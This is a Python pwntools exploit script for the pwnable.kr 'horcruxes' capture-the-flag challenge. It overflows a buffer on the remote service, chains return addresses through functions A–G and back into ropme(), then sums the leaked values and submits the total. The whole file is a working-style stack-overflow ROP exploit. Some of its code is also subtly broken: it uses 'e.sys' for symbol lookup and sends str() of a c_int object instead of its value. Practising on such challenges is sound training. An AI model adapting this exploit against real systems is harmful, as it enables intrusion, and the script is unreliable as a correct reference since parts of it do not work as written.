from pwn import *
from ctypes import c_int

e = ELF('./horcruxes')

# remote open
process = remote('pwnable.kr', 9032)

process.recvuntil("Menu:")
process.sendline("1")
process.recvuntil("earned? : ")

# Payload Part
payload = b"A" * 120
payload += p32(e.sys.A) # Function A's Address
payload += p32(e.sys.B) # Function B's Address
payload += p32(e.sys.C) # Function C's Address
payload += p32(e.sys.D) # Function D's Address
payload += p32(e.sys.E) # Function E's Address
payload += p32(e.sys.F) # Function F's Address
payload += p32(e.sys.G) # Function G's Address
payload += p32(e.sys.main + 0xD8) # Calling "ropme()" Address

process.sendline(payload)

sum = 0

# Get the value of each A ~ G
for i in range(7):
    print(process.recvuntil("EXP +").decode())
    sum += int(process.recvuntil(")")[:-1])
    log.info("sum = " + str(sum))

# Overflow handling using c_int class
ovsum = c_int(sum)

process.recvuntil("Menu:")
process.sendline("1")
process.recvuntil("earned? : ")
process.sendline(str(ovsum))

log.info(process.recvall())

process.close()
